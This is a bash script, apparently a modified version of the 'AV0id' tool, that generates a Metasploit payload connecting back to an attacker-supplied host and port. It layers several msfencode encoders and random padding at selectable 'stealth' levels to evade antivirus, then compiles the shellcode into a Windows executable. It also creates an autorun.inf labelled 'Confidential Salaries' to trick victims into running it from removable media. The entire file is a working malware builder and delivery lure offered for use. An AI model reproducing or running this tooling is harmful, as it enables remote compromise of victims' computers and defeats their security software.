#!/usr/bin/env bash

#Original: AV0id - Metapsloit Payload Anti-Virus Avasion by Daniel Compton 
#modified by:Rakesh Pandey
# User options
OUTPUTNAME="$4" # The payload exe created name


# Random Msfencode encoding iterations
#ITER=`seq 5 10 |sort -R |sort -R | head -1`
ITER=`shuf -i 10-20 -n 1`

echo  "Generating Metasploit payload, please wait..."

#Payload creater
msfpayload $1 LHOST=$2 LPORT=$3 EXITFUNC=thread R | msfencode -e x86/shikata_ga_nai -c $ITER -t raw 2>/dev/null | msfencode -e x86/jmp_call_additive -c $ITER -t raw 2>/dev/null | msfencode -e x86/call4_dword_xor -c $ITER -t raw 2>/dev/null |  msfencode -e x86/shikata_ga_nai -c $ITER -t c > msf.c 2>/dev/null 
echo ""
# Menu

if [ $5 = "1" ]; then
      echo "Normal selected, please wait a few seconds";
    
    echo  "Generating random seed for padding...please wait"
    
    SEED=$(shuf -i 100000-500000 -n 1)
elif [ $5 = "2" ]; then
    echo  "Stealth selected, please wait a few seconds"
    echo  "Generating random seed for padding...please wait"
    
    SEED=$(shuf -i 1000000-5000000 -n 1)
elif [ $5 = "3" ]; then
    echo  "Super Stealth selected, please wait a few seconds"
    echo ""
   
    SEED=$(shuf -i 8000000-12000000 -n 1)
elif [ $5 = "4" ]; then
    echo  " Insane Stealth selected, please wait a few minutes"
    echo  " Generating random seed for padding...please wait"
    
    SEED=$(shuf -i 40000000-60000000 -n 1)
elif [ $5 = "5" ]; then
    echo  " Desperate Stealth selected, please wait a few minutes"
    echo  " Generating random seed for padding...please wait"
    
    SEED=$(shuf -i 100000000-200000000 -n 1)
else
    echo  " You didnt select a option, exiting"
    exit 1
fi

# build the c file ready for compile
echo ""
echo '#include <stdio.h>' >> build.c
echo 'unsigned char padding[]=' >> build.c
cat /dev/urandom | tr -dc _A-Z-a-z-0-9 | head -c$SEED > random
sed -i 's/$/"/' random
sed -i 's/^/"/' random
cat random >> build.c
echo ';' >> build.c
echo 'char payload[] ="";' >> build.c
cat msf.c |grep -v "unsigned" >> build.c
echo 'char comment[512] = "";' >> build.c
echo 'int main(int argc, char **argv) {' >> build.c
echo ' (*(void (*)()) payload)();' >> build.c
echo ' return(0);' >> build.c
echo '}' >> build.c



# gcc compile the exploit

ls cmd/icons/icon.res >/dev/null 2>&1
if [ $? -eq 0 ]; then
    i586-mingw32msvc-gcc -Wall -mwindows cmd/icons/icon.res build.c -o "$OUTPUTNAME"
else
    i586-mingw32msvc-gcc -Wall -mwindows build.c -o "$OUTPUTNAME"
fi

# check if file built correctly

ls "$OUTPUTNAME" >/dev/null 2>&1
if [ $? -eq 0 ]; then
    echo  " Your payload has been successfully created "
else
    echo  " Something went wrong trying to compile the executable, exiting"
    exit 1
fi

# create autorun files
mkdir autorun >/dev/null 2>&1
cp "$OUTPUTNAME" autorun/ >/dev/null 2>&1
cp cmd/icons/autorun.ico autorun/ >/dev/null 2>&1
echo "[autorun]" > autorun/autorun.inf
echo "open="$OUTPUTNAME"" >> autorun/autorun.inf
echo "icon=autorun.ico" >> autorun/autorun.inf
echo "label=Confidential Salaries" >> autorun/autorun.inf
echo "I have also created 3 AutoRun files "
# clean up temp files
rm build.c >/dev/null 2>&1
rm random >/dev/null 2>&1
rm msf.c >/dev/null 2>&1


